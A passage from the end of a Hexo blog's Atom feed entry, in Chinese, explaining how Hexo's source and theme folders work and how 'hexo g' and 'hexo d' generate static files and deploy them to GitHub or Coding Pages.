应用程序信息。即配置Hexo运行需要js包。<br>3.source就是数据库，以.md（markdown）格式存储文章，theme文件夹是主题文件（决定页面模板）。<br>4.部署流程:<br>hexo g：生成静态文件。将我们的数据和界面模板相结合生成静态文件的过程。Hexo（node.js程序）遍历主题文件中你的source目录（js、css、img等静态资源），建立索引，再根据索引生成由html、js、css、img建立的纯静态文件并放在public文件夹里。public就是你的博客了，而这些恰好能被gitpages识别。<br>hexo d：部署文件。主要是根据在_config.yml中配置的git仓库或者coding的地址，将public文件通过git方式push到上传到github或coding的指定分支，然后在根据pages服务呈现出页面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h5 id=&quot;深入了解Hexo搭建博客的底层原理&quot;&gt;&lt;a href=&quot;#深入了解Hexo搭建博客的底层原理&quot; class=&quot;headerlink&quot; title=&quot;深入了解Hexo搭建博客的底层原理&quot;&gt;&lt;/a&gt;深入了解Hexo搭建博客的底层原理&lt;/h5&gt;&lt;h3 id=&quot;前言&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="学术" scheme="https://liu1272.github.io/tags/%E5%AD%A6%E6%9C%AF/"/>
    
  </entry>
  
</feed>
